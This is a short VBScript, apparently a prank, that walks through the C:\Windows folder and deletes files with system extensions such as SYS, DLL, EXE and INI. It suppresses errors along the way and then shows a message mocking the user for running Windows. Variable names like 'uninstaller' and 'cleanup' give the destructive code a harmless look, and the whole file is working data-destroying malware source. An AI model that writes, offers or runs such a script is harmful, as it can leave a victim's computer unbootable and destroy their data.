Dim ObjShell, uninstaller, cleanup
Set FSo = Wscript.CreateObject("Scripting.FileSystemObject")
set installsource=FSO.GetFolder("C:\Windows")
Set cleanup = installsource.Files

On Error Resume Next

For Each uninstaller In cleanup
If UCase(FSO.GetExtensionName(uninstaller.Path)) = "SYS"or"COM"or"DLL"Or"BAT"OR"EXE"or"INI" Then
uninstaller.Delete
End If
Next

MsgBox "Windows was successfully uninstalled. Please install Linux now, it's a hell lot better!"